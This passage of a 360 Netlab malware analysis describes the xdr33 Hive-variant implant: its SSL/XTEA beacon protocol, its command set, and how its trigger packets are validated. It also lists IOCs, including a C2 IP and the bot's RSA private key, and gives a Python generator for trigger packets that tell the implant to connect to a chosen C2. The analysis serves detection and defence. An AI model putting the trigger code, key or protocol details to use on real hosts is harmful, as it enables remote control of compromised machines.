       <p>xdr33的作者使用源码仓库中kaspersky.conf，以及thawte.conf 2个模板生成所需要的Bot证书，C2证书，CA证书。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_certconf.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_certconf.png" class="kg-image"></a></p>
       <p>xdr32中硬编码了DER格式的CA证书，Bot证书和PrivKey。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_sslsock.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_sslsock.png" class="kg-image"></a></p>
       <p>可以使用<code>openssl x509 -in Cert -inform DER -noout -text</code>查看Bot证书，其中CN=xdr33，这正是此家族名字的由来。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_botcert.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_botcert.png" class="kg-image"></a></p>
       <p>可以使用<code>openssl s_client -connect 45.9.150.144:443</code> 查看C2的证书。Bot，C2的证书都伪装成与kaspersky有关，通过这种方式降低网络流量的可疑性。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_c2cert.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_c2cert.png" class="kg-image"></a></p>
       <p>CA证书如下所示，从3个证书的有效期来看，我们推测此次活动的开始时间在2022.10.7之后。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_ca.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_ca.png" class="kg-image"></a></p>
       <h3 id="step2xtea">Step2: 获取XTEA密钥</h3>
       <p>Bot和C2建立SSL通信之后，Bot通过以下代码片段向C2请求XTEA密钥。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2023/01/hive_teakey.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2023/01/hive_teakey.png" class="kg-image"></a></p>
       <p>它的处理逻辑为：</p>
       <ol>
        <li><p>Bot向C2发送64字节数据，格式为"设备信息长度字串的长度（xor 5） + 设备信息长度字串（xor 5） + 随机数据"</p></li>
        <li><p>Bot从C2接收32字节数据，从中得到16字节的XTEA KEY，获取KEY的等效的python代码如下所示：</p><pre><code>XOR_KEY=5
def get_key(rand_bytes):
	offset = (ord(rand_bytes[0]) ^ XOR_KEY) % 15
	return  rand_bytes[(offset+1):(offset+17)]
</code></pre></li>
       </ol>
       <h3 id="step3c2xtea">Step3: 向C2上报XTEA加密的设备信息</h3>
       <p>Bot使用Step2获得的XTEA KEY 对设备信息进行加密，并上报给C2。由于设备信息较多，一般需要分块发送，Bot一次最多发送4052字节，而C2则会回复已接受的字节数。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2023/01/hive_teadevice.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2023/01/hive_teadevice.png" class="kg-image"></a></p>
       <p>另外值得一提的是，XTEA加密只在Step3中使用，后续的Step4中网络流量仅仅使用SSL协商好的加密加密套件，不再使用XTEA。</p>
       <h3 id="step4xdr33">Step4: 等待执行指令（xdr33新增功能）</h3>
       <p>当设备信息上报完毕后，C2向Bot发送8字节的本周期任务次数N，若N等于0就休眠一定时间，进入下一个周期的Beacon Task；反之就下发264字节的任务。Bot接收到任务后，对其进行解析，并执行相应的指令。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2023/01/hive_beaconwaitcmd.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2023/01/hive_beaconwaitcmd.png" class="kg-image"></a></p>
       <p>支持的指令如下表所示：</p>
       <table>
        <thead>
         <tr>
          <th>Index</th>
          <th>Function</th>
         </tr>
        </thead>
        <tbody>
         <tr>
          <td>0x01</td>
          <td>Download File</td>
         </tr>
         <tr>
          <td>0x02</td>
          <td>Execute CMD with fake name "[kworker/3:1-events]"</td>
         </tr>
         <tr>
          <td>0x03</td>
          <td>Update</td>
         </tr>
         <tr>
          <td>0x04</td>
          <td>Upload File</td>
         </tr>
         <tr>
          <td>0x05</td>
          <td>Delete</td>
         </tr>
         <tr>
          <td>0x08</td>
          <td>Launch Shell</td>
         </tr>
         <tr>
          <td>0x09</td>
          <td>Socket5 Proxy</td>
         </tr>
         <tr>
          <td>0x0b</td>
          <td>Update BEACONINFO</td>
         </tr>
        </tbody>
       </table>
       <h2 id>网络流量示例</h2>
       <h3 id="xdr33step2">实际中xdr33产生的step2流量</h3>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2023/01/hive_packet.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2023/01/hive_packet.png" class="kg-image"></a></p>
       <h3 id="step3step4">step3中的交互，以及step4的流量</h3>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2023/01/hive_packetB.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2023/01/hive_packetB.png" class="kg-image"></a></p>
       <h3 id>我们从中能得到什么信息呢？</h3>
       <ol>
        <li><p>设备信息长度字串的长度，0x1 ^ 0x5 = 0x4</p></li>
        <li><p>设备信息长度，0x31,0x32,0x37,0x35 分别 xor 5得到 4720</p></li>
        <li><p>tea key <code>2E 09 9B 08 CF 53 BE E7 A0 BE 11 42 31 F4 45 3A</code></p></li>
        <li><p>C2会确认BOT上报的设备信息长度，4052+668 = 4720,和第2点是能对应上的</p></li>
        <li><p>本周期任务数<code>00 00 00 00 00 00 00 00</code>，即无任务，所以不会下发264字节的具体任务</p></li>
       </ol>
       <p>关于加密的设备信息，可以通过以下代码进行解密，以解密前8字节<code>65 d8 b1 f9 b8 37 37 eb</code>为例，解密后的数据为<code>00 22 00 14 42 5A 68 39</code>，包含了<code>beacon_header_version + os+ bzip magic</code>，和前面的分析能够一一对应。</p>
       <pre><code>import hexdump
import struct

def xtea_decrypt(key,block,n=32,endian="!"):
    v0,v1 = struct.unpack(endian+"2L", block)
    k = struct.unpack(endian+"4L",key)
    delta,mask = 0x9e3779b9,0xffffffff
    sum = (delta * n) &amp; mask
    for round in range(n):
        v1 = (v1 - (((v0&lt;&lt;4 ^ v0&gt;&gt;5) + v0) ^ (sum + k[sum&gt;&gt;11 &amp; 3]))) &amp; mask
        sum = (sum - delta) &amp; mask
        v0 = (v0 - (((v1&lt;&lt;4 ^ v1&gt;&gt;5) + v1) ^ (sum + k[sum &amp; 3]))) &amp; mask
    return struct.pack(endian+"2L",v0,v1)

def decrypt_data(key,data):
    size = len(data)
    i = 0
    ptext = b''
    while i &lt; size:
        if size - i &gt;= 8:
            ptext += xtea_decrypt(key,data[i:i+8])
        i += 8
    return ptext
key=bytes.fromhex("""
2E 09 9B 08 CF 53 BE E7  A0 BE 11 42 31 F4 45 3A
""")
enc_buf=bytes.fromhex("""
65 d8 b1 f9 b8 37 37 eb
""")

hexdump.hexdump(decrypt_data(key,enc_buf))
</code></pre>
       <h1 id="triggertask">Trigger Task</h1>
       <p>Trigger主要功能是监听所有流量，等待特定格式的Triggger IP报文，当报文以及隐藏在报文中的Trigger Payload通过层层校验之后，Bot就和Trigger Payload中的C2建立通信，等待执行下发的指令。</p>
       <h2 id="0x1">0x1: 监听流量</h2>
       <p>使用函数调用<strong>socket( PF_PACKET, SOCK_RAW, htons( ETH_P_IP ) )</strong>，设定RAW SOCKET捕获IP报文，再通过以下代码片段对IP报文处理，可以看出Tirgger支持TCP,UDP，报文Payload最大长度为472字节。这种流量嗅探的实现方式会加大CPU的负载，事实上在socket上使用BPF-Filter效果会更好。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_snfpkt.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_snfpkt.png" class="kg-image"></a></p>
       <h2 id="0x2trigger">0x2: 校验Trigger报文</h2>
       <p>符合长度要求的TCP,UDP报文使用相同的处理函数check_payload进行进一步校验，</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_handxref.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_handxref.png" class="kg-image"></a></p>
       <p><strong>check_payload</strong>的代码如下所示:<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_checkpayload.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_checkpayload.png" class="kg-image"></a></p>
       <p>可以看出它的处理逻辑：</p>
       <ol>
        <li><p>使用CRC16/CCITT-FALSE算法计算报文中偏移8到92的CRC16值，得到crcValue</p></li>
        <li><p>通过crcValue % 200+ 92得到crcValue在在报文中的偏移值，crcOffset</p></li>
        <li><p>校验报文中crcOffset处的数据是否等于crcValue，若相等进入下一步</p></li>
        <li><p>校验报文中crcOffset+2处的数据是否是127的整数倍，若是，进入下一步</p></li>
        <li><p>Trigger_Payload是加密的，起始位置为crcOffset+12，长度为29字节。Xor_Key的起始位置是crcValue%55+8，将2者逐字节XOR，就得到了Trigger_Paylaod</p></li>
       </ol>
       <p>至此可以确定<strong>Trigger报文格式</strong>是这样的：</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_triggerpkt-1.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_triggerpkt-1.png" class="kg-image"></a></p>
       <h2 id="0x3triggerpayload">0x3: 校验 Trigger Payload</h2>
       <p>如果Trigger报文通过校验，则通过check_trigger函数继续对Trigger Payload进行校验</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_triggerfinal.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_triggerfinal.png" class="kg-image"></a></p>
       <p>可以看出它的处理逻辑：</p>
       <ol>
        <li>取出Trigger Payload最后2字节，记作crcRaw</li>
        <li>将Trigger Payload最后2字节置0，计算其CRC16，记作crcCalc</li>
        <li>比较crcRaw，crcCalc，若相等，说明Trigger Payload在结构上是有效的</li>
       </ol>
       <p>接着计算过Trigger Payload中的key的SHA1，和Bot中硬编码的SHA1 <strong>46a3c308401e03d3195c753caa14ef34a3806593</strong>进行比对。如果相等，说明Trigger Payload在内容是也是有效的，可以进入到最后一步，和Trigger Payload中的C2建立通信，等待执行其下发的指令。</p>
       <p>至此可以确定<strong>Trigger Payload</strong>的格式是这样的：</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_triggerfmt-1.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_triggerfmt-1.png" class="kg-image"></a></p>
       <h2 id="0x4triggerc2">0x4: 执行Trigger C2的指令</h2>
       <p>当一个Trigger报文通过层层校验之后，Bot就主动和Trigger Payload中指定的C2进行通信，等待执行C2下发指令。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_triggercmd.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_triggercmd.png" class="kg-image"></a></p>
       <p>支持的指令如下表所示：</p>
       <table>
        <thead>
         <tr>
          <th>Index</th>
          <th>Function</th>
         </tr>
        </thead>
        <tbody>
         <tr>
          <td>0x00,0x00a</td>
          <td>Exit</td>
         </tr>
         <tr>
          <td>0x01</td>
          <td>Download File</td>
         </tr>
         <tr>
          <td>0x02</td>
          <td>Execute CMD</td>
         </tr>
         <tr>
          <td>0x04</td>
          <td>Upload File</td>
         </tr>
         <tr>
          <td>0x05</td>
          <td>Delete</td>
         </tr>
         <tr>
          <td>0x06</td>
          <td>Shutdown</td>
         </tr>
         <tr>
          <td>0x08</td>
          <td>Launch SHELL</td>
         </tr>
         <tr>
          <td>0x09</td>
          <td>SOCKET5 PROXY</td>
         </tr>
         <tr>
          <td>0x0b</td>
          <td>Update BEACONINFO</td>
         </tr>
        </tbody>
       </table>
       <p>值得一提的是，Trigger C2与Beacon C2在通信的细节上有所不同。Bot与Trigger C2在建立SSL隧道之后，会使用Diffie-Helllman密钥交换以建立共享密钥，这把钥匙用于AES算法创建第二层加密。<br><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_aes.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_aes.png" class="kg-image"></a></p>
       <h1 id>实验</h1>
       <p>为了验证Trigger部分逆向分析的正确性，我们对xdr33的SHA1值进行了Patch，填入了<strong>NetlabPatched,Enjoy!</strong> 的SHA1，并实现了附录的GenTrigger代码，用以产生UDP类型Trigger 报文。</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_patchbylab.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_patchbylab.png" class="kg-image"></a></p>
       <p>我们在虚拟机<strong>192.168.159.133</strong>运行Patch后的xdr33样本，构造C2为<strong>192.168.159.128:6666</strong>的Trigger Payload，并以UDP的方式发送给192.168.159.133。最终效果如下，可以看到xdr33所在的implanted host在收到UDP Trigger报文后，和我们预想中的一样，向预设的Trigger C2发起了通信请求，Cool！</p>
       <p><a href="https://blog-netlab-360-com.translate.goog/content/images/2022/12/hive_vmware.png?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp"><img src="https://blog.netlab.360.com/content/images/2022/12/hive_vmware.png" class="kg-image"></a></p>
       <h1 id>联系我们</h1>
       <p>至此xdr33的分析告一段落，这是我们目前掌握的关于这个魔改攻击套件的情况。如果社区有更多线索，以及感兴趣的读者，可以在 <a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=en&amp;client=webapp&amp;u=https://twitter.com/360Netlab?ref%3Dblog.netlab.360.com">twitter</a> 或者通过邮件netlab[at]360.cn联系我们。</p>
       <h1 id="ioc">IOC</h1>
       <h2 id="sample">sample</h2>
       <pre><code>ee07a74d12c0bb3594965b51d0e45b6f

patched sample

af5d2dfcafbb23666129600f982ecb87
</code></pre>
       <h2 id="c2">C2</h2>
       <pre><code>45.9.150.144:443
</code></pre>
       <h2 id="botprivatekey">BOT Private Key</h2>
       <pre><code>-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6XthqPjU3XFu8/4PMVQ4iqJbleXmXhbVWMPhY/sTndEcO5vQ
mIMNJc1mISZTNPzddXSrj0h9GJe0ix0CIZID3bHyZHLiqb/ewylFmqSOVkviG/Je
o17UAqhsNGpVu/l8FM3qCHJE7z+wBqHdwVIZMt9vLaLti2KyJV+j1F1GTk8X2jcI
4DnnVKJE81rSafzaX2JBc6J6hovFMMP9IGb2LwRQMZNtZqSus6JMolhkO0dtvxXK
yTm1k79HL3PlZdgKt6HJFoukwkWND8NNTbcBXDWWDdJ42g/1I0Z7tMkdKFgfjUut
90LXKRRuENcUrbi75L6P2FRwPnqvVv+3N25MZQIDAQABAoIBADtguG57kc8bWQdO
NljqPVLshXQyuop1Lh7b+gcuREffdVmnf745ne9eNDn8AC86m6uSV0siOUY21qCG
aRNWigsohSeMnB5lgGaLqXrxnI1P0RogYncT18ExSgtue41Jnoe/8mPhg6yAuuiE
49uVYHkyn5iwlc7b88hTcVvBuO6S7HPqqXbDEBSoKL0o60/FyPb0RKigprKooTo/
KVCRFDT6xpAGMnjZkSSBJB2cgRxQwkcyghMcLJBvsZXbYNihiXiiiwaLvk4ZeBtf
0hnb6Cty840juAIGKDiUELijd3JtVKaBy41KLrdsnC+8JU3RIVGPtPDbwGanvnCk
Ito7gqUCgYEA+MucFy8fcFJtUnOmZ1Uk3AitLua+IrIEp26IHgGaMKFA0hnGEGvb
ZmwkrFj57bGSwsWq7ZSBk8yHRP3HSjJLZZQIcnnTCQxHMXa+YvpuEKE5mQSMwnlu
YH9S2S0xQPi1yLQKjAVVt+zRuuJvMv0dOZAOfdib+3xesPv2fIBu0McCgYEA8D4/
zygeF5k4Omh0l235e08lkqLtqVLu23vJ0TVnP2LNh4rRu6viBuRW7O9tsFLng8L8
aIohdVdF/E2FnNBhnvoohs8+IeFXlD8ml4LC+QD6AcvcMGYYwLIzewODJ2d0ZbBI
hQthoAw9urezc2CLy0da7H9Jmeg26utwZJB4ZXMCgYEAyV9b/rPoeWxuCd+Ln3Wd
+O6Y5i5jVQfLlo1zZP4dBCFwqt2rn5z9H0CGymzWFhq1VCrT96pM2wkfr6rNBHQC
7LvNvoJ2WotykEmxPcG/Fny4du7k03+f5EEKGLhodlMYJ9P5+W1T/SOUefRO1vFi
FzZPVHLfhcUbi5rU3d7CUv8CgYBG82tu578zYvnbLhw42K7UfwRusRWVazvFsGJj
Ge17J9fhTtswHMwtEuSlJvTzHRjorf5TdW/6MqMlp1Ntg5FBHUo4vh3wbZeq3Zet
KV4hoesz+pv140EuL7LKgrgKPCCBI7XXLQxQ8yyL51LlIT9H8rPkopb/EDif2paf
7JbSBwKBgCY8+aO44uuR2dQm0SIUqnb0MigLRs1qcWIfDfHF9K116sGwSK4SD9vD
poCA53ffcrTi+syPiUuBJFZG7VGfWiNJ6GWs48sP5dgyBQaVq5hQofKqQAZAQ0f+
7TxBhBF4n2gc5AhJ3fQAOXZg5rgNqhAln04UAIlgQKO69fAvfzID
-----END RSA PRIVATE KEY-----

</code></pre>
       <h2 id="botcertificate">BOT Certificate</h2>
       <pre><code>-----BEGIN CERTIFICATE-----
MIIFJTCCBA2gAwIBAgIBAzANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx
FTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD
VQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv
biBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy
dmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t
MB4XDTIyMTAwNzE5NTAwN1oXDTIzMDMxNjE5NTAwN1owgYExCzAJBgNVBAYTAlJV
MR0wGwYDVQQKDBRLYXNwZXJza3kgTGFib3JhdG9yeTEUMBIGA1UEAwwLRW5naW5l
ZXJpbmcxDjAMBgNVBAMMBXhkcjMzMQ8wDQYDVQQIDAZNb3Njb3cxDzANBgNVBAcM
Bk1vc2NvdzELMAkGA1UECwwCSVQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQDpe2Go+NTdcW7z/g8xVDiKoluV5eZeFtVYw+Fj+xOd0Rw7m9CYgw0lzWYh
JlM0/N11dKuPSH0Yl7SLHQIhkgPdsfJkcuKpv97DKUWapI5WS+Ib8l6jXtQCqGw0
alW7+XwUzeoIckTvP7AGod3BUhky328tou2LYrIlX6PUXUZOTxfaNwjgOedUokTz
WtJp/NpfYkFzonqGi8Uww/0gZvYvBFAxk21mpK6zokyiWGQ7R22/FcrJObWTv0cv
c+Vl2Aq3ockWi6TCRY0Pw01NtwFcNZYN0njaD/UjRnu0yR0oWB+NS633QtcpFG4Q
1xStuLvkvo/YVHA+eq9W/7c3bkxlAgMBAAGjggFXMIIBUzAMBgNVHRMBAf8EAjAA
MB0GA1UdDgQWBBRc0LAOwW4C6azovupkjX8R3V+NpjCB+wYDVR0jBIHzMIHwgBTz
BcGhW/F2gdgt/v0oYQtatP2x5aGB1KSB0TCBzjELMAkGA1UEBhMCWkExFTATBgNV
BAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYDVQQKDBRU
aGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlvbiBTZXJ2
aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2VydmVyIENB
MSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29tggEAMA4G
A1UdDwEB/wQEAwIF4DAWBgNVHSUBAf8EDDAKBggrBgEFBQcDAjANBgkqhkiG9w0B
AQsFAAOCAQEAGUPMGTtzrQetSs+w12qgyHETYp8EKKk+yh4AJSC5A4UCKbJLrsUy
qend0E3plARHozy4ruII0XBh5z3MqMnsXcxkC3YJkjX2b2EuYgyhvvIFm326s48P
o6MUSYs5CFxhhp/N0cqmqGgZL5V5evI7P8NpPcFhs7u1ryGDcK1MTtSSPNPy3F+c
d707iRXiRcLQmXQTcjmOVKrohA/kqqtdM5EUl75n9OLTinZcb/CQ9At+5Sn91AI3
ngd22cyLLC3O4F14L+hqwMd0ENSjanX38iZ2EY8hMpmNYwPOVSQZ1FpXqrkW1ArI
lHEtKB3YMeSXQHAsvBQD0AlW7R7JqHdreg==
-----END CERTIFICATE-----

</code></pre>
       <h2 id="cacertificate">CA Certificate</h2>
       <pre><code>-----BEGIN CERTIFICATE-----
MIIFXTCCBEWgAwIBAgIBADANBgkqhkiG9w0BAQsFADCBzjELMAkGA1UEBhMCWkEx
FTATBgNVBAgMDFdlc3Rlcm4gQ2FwZTESMBAGA1UEBwwJQ2FwZSBUb3duMR0wGwYD
VQQKDBRUaGF3dGUgQ29uc3VsdGluZyBjYzEoMCYGA1UECwwfQ2VydGlmaWNhdGlv
biBTZXJ2aWNlcyBEaXZpc2lvbjEhMB8GA1UEAwwYVGhhd3RlIFByZW1pdW0gU2Vy
dmVyIENBMSgwJgYJKoZIhvcNAQkBFhlwcmVtaXVtLXNlcnZlckB0aGF3dGUuY29t
MB4XDTIyMTAwNzE0MTEzOFoXDTQ3MTAwMTE0MTEzOFowgc4xCzAJBgNVBAYTAlpB
MRUwEwYDVQQIDAxXZXN0ZXJuIENhcGUxEjAQBgNVBAcMCUNhcGUgVG93bjEdMBsG
A1UECgwUVGhhd3RlIENvbnN1bHRpbmcgY2MxKDAmBgNVBAsMH0NlcnRpZmljYXRp
b24gU2VydmljZXMgRGl2aXNpb24xITAfBgNVBAMMGFRoYXd0ZSBQcmVtaXVtIFNl
cnZlciBDQTEoMCYGCSqGSIb3DQEJARYZcHJlbWl1bS1zZXJ2ZXJAdGhhd3RlLmNv
bTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMfHJIl4/Xdo896Rlyqr
3VcKnLAAqIJkpgl90Z6bxUDpwa41H3ZDa7As4ZO9xa+lXGn9XB9u34TqJPkyhSKg
3wYK02KTCwVMI/gf506KpFvocTHpScnXs0xUoxsM8qEiDV2pTe447rmyaLyWcT5d
hbzkPl0WuDmEWMhfC2R9z4+mlsbwMAy9PN/JYzxz7cR48qj4j9hhEwkJ1+yJKXBV
AV9CdgLYfJXrA7A4Hxgc0ECKJmpovskv/DlxM8RxOsHfVtyG4ZgqmRraxUelirlf
tLj0fIkLaP7xvo1QSgiqQffbBOiDg9PN3H2wezFOmeDg9RIR6qvhzhyNpZjANiiC
JzMCAwEAAaOCAUIwggE+MA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFPMFwaFb
8XaB2C3+/ShhC1q0/bHlMIH7BgNVHSMEgfMwgfCAFPMFwaFb8XaB2C3+/ShhC1q0
/bHloYHUpIHRMIHOMQswCQYDVQQGEwJaQTEVMBMGA1UECAwMV2VzdGVybiBDYXBl
MRIwEAYDVQQHDAlDYXBlIFRvd24xHTAbBgNVBAoMFFRoYXd0ZSBDb25zdWx0aW5n
IGNjMSgwJgYDVQQLDB9DZXJ0aWZpY2F0aW9uIFNlcnZpY2VzIERpdmlzaW9uMSEw
HwYDVQQDDBhUaGF3dGUgUHJlbWl1bSBTZXJ2ZXIgQ0ExKDAmBgkqhkiG9w0BCQEW
GXByZW1pdW0tc2VydmVyQHRoYXd0ZS5jb22CAQAwDgYDVR0PAQH/BAQDAgGGMA0G
CSqGSIb3DQEBCwUAA4IBAQDBqNA1WFp15AM8l7oDgqa/YHvoGmfcs48Ak8YtrDEF
tLRyz1+hr/hhfR8Hm1hZ0oj1vAzayhCGKdQTk42mq90dG4tViNYMq4mFKmOoVnw6
u4C8BCPfxmuyNFdw9TVqTjdwWqWM84VMg3Cq3ZrEa94DMOAXm3QXcDsar7SQn5Xw
LCsU7xKJc6gwk4eNWEGxFJwS0EwPhBkt1lH4OD11jH0Ukr5rRJvh1blUiOHPd3//
kzeXNozA9PwoH4wewqk8bXZhj5ZA9LR7rm+5OrCoWXofgn1Gi2yd+LWWCrE7NBWm
yRelxOSPRSQ1fvAVvuRrCnCJgKxG/2Ba2DLs95u6IxYX
-----END CERTIFICATE-----

</code></pre>
       <h1 id>附录</h1>
       <h2 id="0x1decode_res">0x1 Decode_RES</h2>
       <pre><code>import idautils
import ida_bytes

def decode(addr,len):
    tmp=bytearray()
    
    buf=ida_bytes.get_bytes(addr,len)
    for i in buf:
        tmp.append(~i&amp;0xff)

    print("%x, %s" %(addr,bytes(tmp)))
    ida_bytes.put_bytes(addr,bytes(tmp))
    idc.create_strlit(addr,addr+len)
    
calllist=idautils.CodeRefsTo(0x0804F1D8,1)
for addr in calllist:
    prev1Head=idc.prev_head(addr)
    if 'push    offset' in idc.generate_disasm_line(prev1Head,1) and idc.get_operand_type(prev1Head,0)==5:
        bufaddr=idc.get_operand_value(prev1Head,0)
        prev2Head=idc.prev_head(prev1Head)
        
        if 'push' in idc.generate_disasm_line(prev2Head,1) and idc.get_operand_type(prev2Head,0)==5:
            leng=idc.get_operand_value(prev2Head,0)
            decode(bufaddr,leng)

</code></pre>
       <h2 id="0x02gentrigger">0x02 GenTrigger</h2>
       <pre><code>import random
import socket


def crc16(data: bytearray, offset, length):
  if data is None or offset &lt; 0 or offset &gt; len(data) - 1 and offset + length &gt; len(data):
    return 0
  crc = 0xFFFF
  for i in range(0, length):
    crc ^= data[offset + i] &lt;&lt; 8
    for j in range(0, 8):
      if (crc &amp; 0x8000) &gt; 0:
        crc = (crc &lt;&lt; 1) ^ 0x1021
      else:
        crc = crc &lt;&lt; 1
  return crc &amp; 0xFFFF

def Gen_payload(ip:str,port:int):
    out=bytearray()
    part1=random.randbytes(92)
    sum=crc16(part1,8,84)
  
    offset1=sum % 0xc8
    offset2=sum % 0x37
    padding1=random.randbytes(offset1)
    padding2=random.randbytes(8)
    
    
    host=socket.inet_aton(ip)
    C2=bytearray(b'\x01')
    C2+=host
    C2+=int.to_bytes(port,2,byteorder="big")
    key=b'NetlabPatched,Enjoy!'
    C2 = C2+key +b'\x00\x00'
    c2sum=crc16(C2,0,29)
    C2=C2[:-2]
    C2+=(int.to_bytes(c2sum,2,byteorder="big"))

    flag=0x7f*10
    out+=part1
    out+=padding1
    out+=(int.to_bytes(sum,2,byteorder="big"))
    out+=(int.to_bytes(flag,2,byteorder="big"))
    out+=padding2

    tmp=bytearray()
    for i in range(29):
      tmp.append(C2[i] ^ out[offset2+8+i])
    out+=tmp

    leng=472-len(out)
    lengpadding=random.randbytes(random.randint(0,leng+1))
    out+=lengpadding

    return out
    
payload=Gen_payload('192.168.159.128',6666)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.sendto(payload,("192.168.159.133",2345))  # 任意端口

</code></pre><!--kg-card-end: markdown-->
      </section>
      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/warning-hive-variant-xdr33-is-coming_cn/";
          this.page.identifier = "ghost-637dc7a7e3e3c900072edb93"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
     </article>
    </main>
    <aside class="read-more-wrap outer">
     <div class="inner">
      <div class="read-more-feed">
       <article class="read-more-card" style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)">
        <header class="read-more-card-header"><small class="read-more-card-header-sitetitle">— 360 Netlab Blog - Network Security Research Lab at 360 —</small>
         <h3 class="read-more-card-header-title"><a href="https://blog-netlab-360-com.translate.goog/tag/botnet/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">Botnet</a></h3>
        </header>
        <div class="read-more-divider">
